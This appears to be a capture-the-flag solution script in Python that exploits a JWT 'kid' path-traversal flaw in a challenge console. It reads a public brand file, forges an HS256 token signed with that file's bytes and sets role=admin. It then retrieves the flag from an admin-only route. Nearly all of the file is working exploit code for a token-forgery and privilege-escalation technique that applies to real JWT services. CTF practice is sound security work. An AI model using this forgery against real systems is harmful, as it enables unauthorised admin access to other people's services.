#!/usr/bin/env python3
"""
Vardanne Command operations console — HS256 kid path traversal.

The console resolves each JWT's signing key by the token header's `kid`. `kid` is used
as a filename inside the key directory without sanitisation, so `../public/brand.txt`
makes the console verify the token against a brand asset that is served publicly.
Sign with those exact bytes, set role=admin on the issued analyst subject, and the
admin-only custody route answers with the flag.
"""

import base64
import hashlib
import hmac
import json
import sys
import urllib.error
import urllib.request

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://w02.ctf.chronos-security.ro:33768"
UA = "vardanne-analyst/1.0"
TRAVERSAL_KID = "../public/brand.txt"
ADMIN_ROUTE = "/admin/recovery-key"


def http(path: str, token: str | None = None) -> tuple[int, bytes]:
    req = urllib.request.Request(BASE + path, headers={"User-Agent": UA})
    if token:
        req.add_header("Authorization", "Bearer " + token)
    try:
        with urllib.request.urlopen(req, timeout=15) as resp:
            return resp.status, resp.read()
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read()


def b64url(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def forge(payload: dict, key: bytes, kid: str) -> str:
    header = {"alg": "HS256", "typ": "JWT", "kid": kid}
    signing_input = "%s.%s" % (
        b64url(json.dumps(header, separators=(",", ":")).encode()),
        b64url(json.dumps(payload, separators=(",", ":")).encode()),
    )
    sig = hmac.new(key, signing_input.encode(), hashlib.sha256).digest()
    return signing_input + "." + b64url(sig)


def main() -> int:
    code, body = http("/token")
    issued = json.loads(body)
    subject = issued["sub"]
    print("[token ] HTTP %d sub=%s role=%s" % (code, subject, issued.get("role")))
    analyst_token = issued["token"]

    code, key_material = http("/public/brand.txt")
    print("[asset ] HTTP %d /public/brand.txt = %d bytes" % (code, len(key_material)))

    code, body = http(ADMIN_ROUTE, analyst_token)
    print("[control] analyst token -> %d %s" % (code, body.decode().strip()))

    admin_token = forge({"sub": subject, "role": "admin"}, key_material, TRAVERSAL_KID)
    code, body = http(ADMIN_ROUTE, admin_token)
    print("[exploit] kid=%r role=admin -> %d %s" % (TRAVERSAL_KID, code, body.decode().strip()))

    code, body = http("/admin/flag", admin_token)
    print("[note  ] GET /admin/flag -> %d %s" % (code, body.decode().strip()))

    if code == 404:
        code, body = http(ADMIN_ROUTE, admin_token)
        print("[flag  ] %s" % json.loads(body)["recovery_key"])
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
